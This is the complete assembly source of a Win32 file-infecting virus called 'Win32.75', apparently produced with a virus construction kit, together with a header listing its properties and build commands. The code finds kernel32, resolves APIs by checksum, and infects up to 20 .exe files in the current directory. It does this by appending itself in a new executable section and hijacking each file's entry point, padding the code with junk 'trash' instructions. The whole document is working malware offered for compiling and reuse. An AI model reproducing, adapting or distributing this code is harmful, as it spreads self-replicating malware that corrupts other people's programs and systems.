              
;
;
; Win32.75 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.75
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 75
;  Infection Type         : adding a new section 
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 29
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 add esp, 4d
 mov edx, dword ptr [esp-4]
 sub edx, offset Delta
                                        ; mov ebp, edx
                                        ; clear ebp
 and ebp, 0
 add ebp, edx
 jmp KernelSearchStart


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx

 mov eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], eax




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edx, [ebp+filemask]
 xchg edx, ebx

                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost
 and dword ptr [ebp+Trash1], 909522     ; Trash


;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov edx, offset WFD_szFileName
 add edx, ebp

                                        ; mov ebx, 276
 push 276d
 pop ebx

ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 sub edx, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov ebx, ebp
 add ebx, offset WIN32_FIND_DATA

 push ebx
 mov edx, dword ptr [ebp+FindHandle]
 sar eax, 7d                            ; Trash
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]

 push edi
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 0
 div ebx
                                        ; add eax, 1
 inc eax
 mul ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 lea ecx, [ebp+APIOffsets]
 xchg edi, ecx

 lea ecx, [ebp+APINames]
 add edx, 65694778d                     ; Trash
 xchg eax, ecx


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; eax points to the CRC
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add eax, 4
 dec eax
 add eax, 5d
 push dword ptr [ebp+TempAPI]
 pop ecx
 mov dword ptr [edi], -1
 and dword ptr [edi], ecx
                                        ; add edi, 4
 dec edi
 add edi, 5d
 dec ebx
 jnz GetApisLoop
 jmp Outbreak



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov ebx, ebp
 add ebx, offset WFD_szFileName

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea ebx, [ebp+WFD_szFileName]
 xchg ecx, ebx


 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 add eax, -1
 add eax, 1
 jz NoInfection
                                        ; check for minimum filesize
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ebx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; mov ebx, 35677
 push 35677d
 pop ebx
 cmp ebx, 0
 jne Notagoodfile
Goodfile:
 cmp word ptr [eax+3Ch], 0h
 je Notagoodfile
 push dword ptr [eax+3Ch]
 pop ecx
                                        ; check if header lies inside the file
 cmp ecx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add ecx, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je Goodfile2
                                        ; mov ebx, 40771
 mov ebx, ( 40771d - 14d )
 add ebx, 14d
 cmp ebx, 40771d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], '75'
 jz Notagoodfile
                                        ; check for DLL
 mov bx, word ptr [ecx+16h]
 and bx, 0F000h
 cmp bx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
 mov edx, dword ptr [ebp+Attributes]
 push edx
 lea edi, [ebp+WFD_szFileName]
 xchg edx, edi

 push edx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear edi
 mov edi, 0
 add edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ebx
 sub ebx, ebx
 add ebx, [edi+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 inc ebx
 add ebx, 27d
                                        ; get ATableVA
 mov edi, dword ptr [ebx]
                                        ; add ebx, 4
 add ebx, 4d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; get NTableVA
 mov edi, dword ptr [ebx]
                                        ; add ebx, 4
 add ebx, 4d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; get OTableVA
 mov edi, dword ptr [ebx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
 mov edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], -1
 and dword ptr [ebp+NTableTemp], edx
 mov ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [edx]
                                        ; mov edx, ebx
 mov edx, ebx
                                        ; mov edi, edx
 push edx
 pop edi
 push edi
 mov dword ptr [ebp+TempApisearch3], eax
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [eax]
 LoopChsksm:
                                        ; clear ebx
 sub ebx, ebx
 mov bl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 shl bx,8d
 sub ecx, ebx
 test bx, bx
 jz LoopConti
                                        ; clear ebx
 sub ebx, ebx
 mov bl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 sub ecx, ebx
 test bx, bx
 jnz LoopChsksm
LoopConti:
 cmp ecx, 0
 je FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 push dword ptr [ebp+TempApisearch3]
 pop eax
                                        ; mov edx, -1
 mov edx, ( -1d - 3d )
 add edx, 3d
 and edx, dword ptr [ebp+NTableTemp]
                                        ; add edx, 4
 inc edx
 adc ecx, 37757195d                     ; Trash
 add edx, 3d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
                                        ; clear edx
 push 0
 pop edx
 mov dx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 push edx
 pop edi
                                        ; clear edx
 xor edx, edx
 mov dx, word ptr [edi]
 shl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [edx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 mov ebx, 42716d
 sub ebx, 42716d
 add ebx, dword ptr [ebp+Trash1]

 push ebx
 adc dword ptr [ebp+Trash1], 173636     ; Trash
 pop dword ptr [ebp+Trash2]

 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx

                                        ; mov edi, -1
 push -1d
 pop edi
 and edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 sub ebp, -1d
 sub ebp, 1
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retEIP dd 0h
 add eax,12345678h
 org $-4
 retBase dd 0h
 push eax
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 FindHandle  dd 0h
 TempApisearch3 dd 0h
 NTableTemp  dd 0h
 KernelMZ    dd 0h
 OldEIP      dd 0h
 db 'Virus : Win32.75 Author : SnakeByte',0
 Trash1      dd 0h
 KernelPE    dd 0h
 AlignReg1   dd 0h
 MapHandle   dd 0h
 NewSize     dd 0h

newsection:                           ; Settings for the new section
 nsname           db '.section'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 NTableVA    dd 0h
 Misc1       dd 0h
 TempAPI     dd 0h
 Attributes  dd 0h
 sectionalign   dd 0h
 filealign   dd 0h
 PEheader    dd 0h
 AlignReg2   dd 0h
 FileHandle  dd 0h
 MapAddress  dd 0h
 Trash2      dd 0h
 InfCounter  dd 0h
 filemask    db '*.Exe',0
 NewEIP      dd 0h
 counter     dw 0h
 OTableVA    dd 0h
 OldBase     dd 400000h

 APINames:
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h

 ATableVA    dd 0h

 APIOffsets:
 XSetFileAttributesA    dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XGetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XFindFirstFileA        dd 0h
 XCloseHandle           dd 0h
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileA           dd 0h





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop edx
 inc esp
 sub esp, 5d
                                        ; round to pages
 mov dx, 0h
                                        ; add edx, 1
 inc edx
GetKernelLoop:
                                        ; clear ecx
 and ecx, 0
 dec edx
 mov cx, word ptr [edx+03ch]
 test cx,0f800h
 jnz GetKernelLoop
 cmp edx, dword ptr [edx+ecx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], edx
                                        ; add edx, 60
 add edx, 60d
 mov ebx, [edx]
 dec edx
 sub edx, 59d
 xor ecx, ebx                           ; Trash
 add ebx, edx
 mov [KernelPE+ebp], ebx

 lea edx, GetApis
 add edx, ebp

 push edx
ret


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 mov esi, ebp
 add esi, offset WFD_szFileName

 push esi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear ecx
 mov ecx, -44305d
 add ecx, 44305d
 xor ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
 test eax, eax
 jz CloseFile
 push ecx
 push 0
 push 0
                                        ; mov ebx, 2
 mov ebx, ( 2d xor 34d )
 xor ebx, 34d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edi, [ebx+3Ch]
 add edi, ebx
                                        ; get File Alignment
 mov edx, [edi+3Ch]
 mov dword ptr [ebp+filealign], edx
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 push ecx
 pop dword ptr [ebp+PEheader]
                                        ; get old Entrypoint
 mov edx, dword ptr [ecx+34h]
 mov dword ptr [ebp+OldBase], edx
 mov edx, dword ptr [ecx+28h]
 push edx
 pop dword ptr [ebp+OldEIP]
 mov eax, [ecx+38h]
 mov dword ptr [ebp+sectionalign], eax
                                        ; Get last section
 mov eax, [ecx+74h]
 shl eax, 3
                                        ; clear edx
 sub edx, edx
 mov dx, word ptr [ecx+6h]
 mov ebx, 28h
 pushad
 mov eax, edx
 mul ebx
 mov dword ptr [ebp+Misc1], 0
 add dword ptr [ebp+Misc1], eax
 popad
 mov edx, dword ptr [ebp+Misc1]
 add ecx, 78h
 add ecx, eax
 add ecx, edx
 lea eax, [ebp+newsection]
 xchg eax, ebx


 xchg ebx, ecx
 push ebx
                                        ; Calculate the RVA of the new section
 mov eax, [ebx-5*8+8d]
 add eax, [ebx-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+nsphysicalsize], eax
 Call Align
                                        ; clear edx
 mov edx, 0
 xor edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 push eax
 pop dword ptr [ebp+AlignReg2]
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [ebp+nsvirtualsize], -1
 and dword ptr [ebp+nsvirtualsize], ecx
                                        ; calculate physical offset
 mov ecx,[ebx-5*8+20d]
 add ecx,[ebx-5*8+16d]
 mov edx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ecx
 push edx
 pop dword ptr [ebp+AlignReg2]
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], 0
 add dword ptr [ebp+nsphysicaloffset], ecx
                                        ; calculate new size
 mov edx, dword ptr [ebp+filealign]
 mov eax, ecx
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+AlignReg1], eax
 call Align
 push dword ptr [ebp+AlignReg1]
 mov ecx, edx                           ; Trash
 pop eax
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 push eax
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
                                        ; mov ebx, 64
 push 64d
 pop ebx
 mov ecx, offset newsection
 add ecx, ebp

 pop edi
WriteNewSectionLoop:
 mov ah, byte ptr [ecx]
 mov byte ptr [edi], ah
                                        ; add ecx, 1
 sub ecx, -1d
 add ebx, -1
                                        ; add edi, 1
 inc edi
 or ebx, ebx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+PEheader]
 inc word ptr [ebx+06h]
 mov eax, dword ptr [ebp+nsRVA]
 push eax
 pop dword ptr [ebp+NewEIP]
                                        ; set new EIP
 mov dword ptr  [ebx+28h], eax
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], 0h
 add dword ptr [ebx+4Ch], '75'
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+nsphysicaloffset]
 push edx
                                        ; Append Virus
 pop edi
 lea esi, [ebp+Virus]

 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 add ecx, -1
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 pop edx
 stc
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 adc ebx, ecx                           ; Trash
                                        ; clear ebx
 mov ebx, -20637d
 add ebx, 20637d
 push ebx
 sub edx, 16409037d                     ; Trash
 call ExitProcess



end FakeCode

